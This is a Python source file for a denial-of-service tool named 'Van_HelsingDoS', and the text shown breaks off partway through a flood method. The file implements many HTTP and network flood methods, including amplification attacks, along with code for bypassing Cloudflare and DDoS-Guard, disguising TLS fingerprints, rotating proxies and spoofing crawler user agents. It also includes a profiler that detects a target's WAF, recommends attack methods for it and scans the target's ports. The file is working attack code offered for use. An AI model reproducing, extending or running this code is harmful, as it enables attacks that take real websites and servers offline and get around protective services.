#!/usr/bin/env python3

import sys
import os
import subprocess

# [PRE-FLIGHT CHECK]
try:
    import httpx
    import cloudscraper
    import PyRoxy
except ImportError:
    print('Missing dependencies. Redirecting to auto-installer...')
    subprocess.check_call([sys.executable, 'install.py'])
    sys.exit(1)

import asyncio
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
import httpx
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

# [OPTIMIZED] Ulimit (File Descriptor) Booster for Linux/Kali
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    # Try escalating progressively: 1M -> 500K -> 100K -> hard limit
    for target_fd in [1000000, 500000, 100000, hard]:
        try:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target_fd, target_fd))
            break
        except (ValueError, OSError):
            continue
except ImportError:
    pass  # Windows doesn't have resource module

# [OPTIMIZED] uvloop — C-based event loop for Linux (2-4x faster than default)
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    uvloop_status = True
except ImportError:
    uvloop_status = False



from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
try:
    from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

# [V6] Optional TLS Fingerprint Evasion
try:
    import tls_client
    HAS_TLS_CLIENT = True
except ImportError:
    HAS_TLS_CLIENT = False

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("Van_HelsingDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
# Enforce only TLSv1.2+
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
else:
    # Fallback for older Python versions
    if hasattr(ssl, "OP_NO_TLSv1"):
        ctx.options |= ssl.OP_NO_TLSv1
    if hasattr(ssl, "OP_NO_TLSv1_1"):
        ctx.options |= ssl.OP_NO_TLSv1_1
# [OPTIMIZED] Browser-Like Ciphers (Chrome 136+)
ctx.set_ciphers(
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
)

__version__: str = "6.0 VAN HELSING"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
tor2webs = [
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]

# [V8] Global CF Clearance Token from turnstile_dispenser
GLOBAL_CF_CLEARANCE = None
cf_path = __dir__ / "files" / "cf_clearance.txt"
if cf_path.exists():
    GLOBAL_CF_CLEARANCE = cf_path.read_text().strip()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
        "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD", "CHAOS", "H3_QUIC"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    # ---------------- Google ----------------
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",

    # ---------------- Bing / Microsoft ----------------
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",

    # ---------------- Yahoo ----------------
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",

    # ---------------- Yandex ----------------
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    
    # ---------------- Baidu ----------------
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",

    # ---------------- DuckDuckGo ----------------
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",

    # ---------------- Applebot ----------------
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",

    # ---------------- Facebook / Social ----------------
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",

    # ---------------- Twitter ----------------
    "Twitterbot/1.0",

    # ---------------- LinkedIn ----------------
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",

    # ---------------- Pinterest ----------------
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",

    # ---------------- Other Major Bots ----------------
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",


    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
]




class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
TOTAL_REQUESTS_SENT = Counter()
CONNECTIONS_SENT = Counter()
ERROR_COUNT = Counter()  # [V6] Structured Error Tracking
LAST_ERROR = ""  # [V6] Last error message for display
BURNED_PROXIES = {} # [PHASE 11] Temporal Blacklist: Proxy -> BurnTimestamp
COOLING_PERIOD = 300 # [PHASE 11] 5 Minutes cooldown for blocked proxies
RECYCLE_EVENT = Event()
IS_RECYCLING = False
PROXY_ALIVE_COUNT = Counter()  # [V6] Live proxy counter for health display


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')
    
    @staticmethod
    def get_random_indo_ip():
        # [NEW] Generate Indonesian Residential IPs (Telkomsel, Indihome, XL)
        ranges = [
            "114.124.{}.{}", "182.253.{}.{}", # Telkomsel
            "180.244.{}.{}", "125.160.{}.{}", # Indihome
            "112.215.{}.{}", # XL
            "139.192.{}.{}" # More Indihome
        ]
        chosen = randchoice(ranges)
        return chosen.format(randint(0, 255), randint(1, 254))
    
    @staticmethod
    def crawl(url_str):
        # [NEW] Active Reconnaissance - Scrape for Real Paths
        try:
            from urllib.parse import urlparse
            import urllib.request
            import re
            
            p = urlparse(url_str)
            base = f"{p.scheme}://{p.netloc}"
            
            # Simple GET request
            req = urllib.request.Request(url_str, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                html = response.read().decode('utf-8', errors='ignore')
                
            # Regex to find hrefs
            links = re.findall(r'href=["\'](/?.*?)["\']', html)
            valid_paths = set() 
            for link in links:
                # [STRICT] Strictly exclude absolute URLs or links with domain markers
                if link.startswith('http') or '://' in link or '//' in link:
                    if p.netloc in link: # Still internal? Extract relative
                        try:
                            found_p = urlparse(link)
                            if found_p.path:
                                valid_paths.add(found_p.path)
                        except: pass
                elif link.startswith('/') and len(link) > 1:
                    # Clean fragments and queries for the core path list
                    clean_path = link.split('#')[0].split('?')[0]
                    if clean_path and clean_path.startswith('/') and '.' not in clean_path.split('/')[-1]:
                         valid_paths.add(clean_path)
            
            # [PHASE 6] Heavy Path Prioritization
            heavy_keywords = ['search', 'login', 'checkout', 'cart', 'account', 'register', 'wp-admin', '?s=']
            heavy_paths = [path for path in valid_paths if any(k in path.lower() for k in heavy_keywords)]
            
            return list(valid_paths | set(heavy_paths))
        except Exception:
            return []

    @staticmethod
    def human_format(num: int, ending: str = "B") -> str:
        num = float('{:.3g}'.format(num))
        magnitude = 0
        while abs(num) >= 1024:
            magnitude += 1
            num /= 1024.0
        return '{}{}{}'.format('{:f}'.format(num).rstrip('0').rstrip('.'),
                               ['', 'K', 'M', 'G', 'T', 'P'][magnitude], ending)

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

    @staticmethod
    def track_error(e: Exception):
        """[V6] Structured error tracking instead of silent pass"""
        global ERROR_COUNT, LAST_ERROR
        ERROR_COUNT += 1
        LAST_ERROR = str(e)[:80]


# [V8] Target Profiler — Auto-detect WAF/CDN/Server stack and suggest best methods
class TargetProfiler:
    """Probes target and returns a profile dict with server, waf, and recommended methods."""
    
    CDN_HEADERS = {
        'cf-ray': 'Cloudflare', 'cf-cache-status': 'Cloudflare',
        'x-cdn': 'CDN', 'x-cache': 'CDN/Varnish',
        'x-akamai-transformed': 'Akamai', 'x-sucuri-id': 'Sucuri',
        'x-powered-by-plesk': 'Plesk', 'server-timing': 'CDN',
        # [V36] Indonesian e-commerce CDN detection
        'x-shopee-token': 'Shopee-CDN', 'x-shopee-request-id': 'Shopee-CDN',
        'x-toped-cache': 'Tokopedia-CDN', 
        'x-bukalapak-id': 'Bukalapak-CDN',
        'x-fastly-request-id': 'Fastly',
        'x-amz-cf-id': 'AWS WAF/CloudFront', 'x-amz-cf-pop': 'AWS WAF/CloudFront',
        'x-azure-ref': 'Azure Front Door',
    }
    
    WAF_SIGNATURES = {
        'cloudflare': 'Cloudflare',
        'ddos-guard': 'DDoS-Guard',
        'sucuri': 'Sucuri',
        'akamai': 'Akamai',
        'incapsula': 'Imperva/Incapsula',
        'stackpath': 'StackPath',
        'aws': 'AWS WAF/CloudFront',
        'fastly': 'Fastly',
        # [V36] Additional WAF signatures
        'barracuda': 'Barracuda',
        'f5 big-ip': 'F5 BIG-IP',
        'fortiweb': 'Fortinet',
        'wallarm': 'Wallarm',
        'qrator': 'Qrator',
        'stormwall': 'StormWall',
        'edgecast': 'Edgecast/Verizon',
        'section.io': 'Section.io',
        'reblaze': 'Reblaze',
    }
    
    METHOD_MAP = {
        'Cloudflare':           ['CFB', 'CFBUAM', 'H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'BYPASS'],
        'DDoS-Guard':           ['DGB', 'H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN'],
        'Akamai':               ['H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN', 'STRESS'],
        'Imperva/Incapsula':    ['H2_FLOOD', 'BYPASS', 'SLOW_V2', 'POST_DYN'],
        'AWS WAF/CloudFront':   ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS', 'XMLRPC_AMP'],
        'Sucuri':               ['BYPASS', 'H2_FLOOD', 'POST_DYN'],
        'Fastly':               ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
        'Azure Front Door':     ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
        'Shopee-CDN':           ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
        'Tokopedia-CDN':        ['H2_FLOOD', 'POST_DYN', 'STRESS'],
        'nginx':                ['SLOW_V2', 'STRESS', 'POST_DYN', 'GET', 'XMLRPC_AMP'],
        'apache':               ['APACHE', 'SLOW', 'SLOW_V2', 'XMLRPC_AMP', 'STRESS'],
        'iis':                  ['STRESS', 'GET', 'POST_DYN', 'H2_FLOOD'],
        'litespeed':            ['POST_DYN', 'STRESS', 'XMLRPC_AMP', 'H2_FLOOD'],
        'unknown':              ['GET', 'STRESS', 'POST_DYN', 'H2_FLOOD'],
    }
    
    # [V36] Common alternative ports for attack surface expansion
    RECON_PORTS = [80, 443, 8080, 8443, 2083, 2087, 3000, 8888, 9090]
    
    @staticmethod
    def profile(url_str: str) -> dict:
        """Probe target and return profile with server, waf, recommendations."""
        result = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': [], 'headers': {}, 'open_ports': [], 'alt_svc': ''}
        
        try:
            resp = get(url_str, timeout=8, verify=False, allow_redirects=True,
                       headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
            result['headers'] = dict(resp.headers)
            body = resp.text[:8000].lower()
            
            # [V36] Capture Alt-Svc for QUIC target detection
            result['alt_svc'] = resp.headers.get('alt-svc', '')
            
            # Detect Server
            server = headers.get('server', '')
            if 'nginx' in server: result['server'] = 'nginx'
            elif 'apache' in server: result['server'] = 'apache'
            elif 'litespeed' in server: result['server'] = 'litespeed'
            elif 'microsoft-iis' in server: result['server'] = 'iis'
            elif 'cloudflare' in server: result['server'] = 'cloudflare'
            elif 'openresty' in server: result['server'] = 'nginx'  # OpenResty = nginx fork
            
            # Detect WAF/CDN
            for hdr, waf_name in TargetProfiler.CDN_HEADERS.items():
                if hdr in headers:
                    result['waf'] = waf_name
                    break
            
            if not result['waf']:
                for sig, waf_name in TargetProfiler.WAF_SIGNATURES.items():
                    if sig in server or sig in str(headers) or sig in body:
                        result['waf'] = waf_name
                        break
            
            # [V36] Enhanced CMS Detection
            if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body:
                result['cms'] = 'WordPress'
            elif 'joomla' in body or '/administrator/' in body:
                result['cms'] = 'Joomla'
            elif 'drupal' in body or 'x-generator' in headers and 'drupal' in headers.get('x-generator', ''):
                result['cms'] = 'Drupal'
            elif 'laravel_session' in str(resp.cookies) or 'xsrf-token' in str(resp.cookies).lower():
                result['cms'] = 'Laravel'
            elif '__next' in body or '_next/static' in body:
                result['cms'] = 'Next.js'
            elif 'magento' in body or 'mage-cache' in body:
                result['cms'] = 'Magento'
            elif 'prestashop' in body:
                result['cms'] = 'PrestaShop'
            
            # Build recommendations
            key = result['waf'] or result['server'] or 'unknown'
            result['methods'] = TargetProfiler.METHOD_MAP.get(key, TargetProfiler.METHOD_MAP['unknown'])
            
            # CMS-specific additions
            if result['cms'] == 'WordPress':
                if 'XMLRPC_AMP' not in result['methods']:
                    result['methods'].insert(0, 'XMLRPC_AMP')
                if 'WP_SEARCH' not in result['methods']:
                    result['methods'].insert(1, 'WP_SEARCH')
            
            # [V36] Lightweight port scan for attack surface expansion
            try:
                from urllib.parse import urlparse
                host = urlparse(url_str).netloc.split(':')[0]
                for port in [8080, 8443, 2083, 2087, 3000]:
                    try:
                        import socket as _s
                        s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
                        s.settimeout(1.5)
                        if s.connect_ex((host, port)) == 0:
                            result['open_ports'].append(port)
                        s.close()
                    except Exception:
                        pass
            except Exception:
                pass
                    
        except Exception as e:
            result['methods'] = TargetProfiler.METHOD_MAP['unknown']
        
        return result


# [V6] Proxy Health Checker — Background thread that periodically validates proxies
class ProxyHealthChecker(Thread):
    def __init__(self, proxies_list: list, interval: int = 60, timeout: float = 3.0):
        Thread.__init__(self, daemon=True)
        self._proxies = proxies_list
        self._interval = interval
        self._timeout = timeout

    def run(self):
        global PROXY_ALIVE_COUNT
        while True:
            sleep(self._interval)
            if not self._proxies:
                continue
            
            # Sample check: test 10% of proxies (min 5, max 50)
            sample_size = max(5, min(50, len(self._proxies) // 10))
            sample = [randchoice(self._proxies) for _ in range(sample_size)]
            alive = 0
            
            for p in sample:
                try:
                    s = socket(AF_INET, SOCK_STREAM)
                    s.settimeout(self._timeout)
                    p_str = str(p)
                    if ":" in p_str:
                        parts = p_str.replace("//", "").split(":")
                        host = parts[-2].split("@")[-1]
                        port = int(parts[-1])
                        s.connect((host, port))
                        alive += 1
                    s.close()
                except Exception:
                    pass
            
            # Extrapolate from sample
            if sample_size > 0:
                alive_ratio = alive / sample_size
                estimated_alive = int(alive_ratio * len(self._proxies))
                PROXY_ALIVE_COUNT.set(estimated_alive)
                
                if alive_ratio < 0.1:
                    logger.warning(f"{bcolors.FAIL}[HEALTH] Proxy pool critical! Only ~{estimated_alive} alive. Triggering recycle...{bcolors.RESET}")
                    RECYCLE_EVENT.set()


# [V6] Stealth Client — TLS fingerprint evasion using tls_client library
class StealthClient:
    """Wrapper that uses tls_client for Chrome-identical JA3 fingerprint"""
    
    @staticmethod
    def create_session(proxy_url: str = None):
        if HAS_TLS_CLIENT:
            session = tls_client.Session(
                client_identifier="chrome_131",
                random_tls_extension_order=True
            )
            if proxy_url:
                session.proxies = {
                    "http": proxy_url,
                    "https": proxy_url
                }
            return session
        else:
            # Fallback to requests Session
            s = Session()
            if proxy_url:
                s.proxies = {"http": proxy_url, "https": proxy_url}
            s.verify = False
            return s

    @staticmethod
    def stealth_get(url: str, proxy_url: str = None, timeout: int = 5):
        """Single stealth GET request with Chrome JA3 fingerprint"""
        global REQUESTS_SENT, BYTES_SEND
        session = StealthClient.create_session(proxy_url)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
                "Upgrade-Insecure-Requests": "1",
            }
            if HAS_TLS_CLIENT:
                resp = session.get(url, headers=headers, timeout_seconds=timeout)
            else:
                resp = session.get(url, headers=headers, timeout=timeout, verify=False)
            REQUESTS_SENT += 1
            BYTES_SEND += len(url) + 500  # Approximate
            return resp
        except Exception as e:
            Tools.track_error(e)
            return None
        finally:
            if not HAS_TLS_CLIENT and hasattr(session, 'close'):
                session.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP, 
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxy_cycle:
            s = next(self._proxy_cycle).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
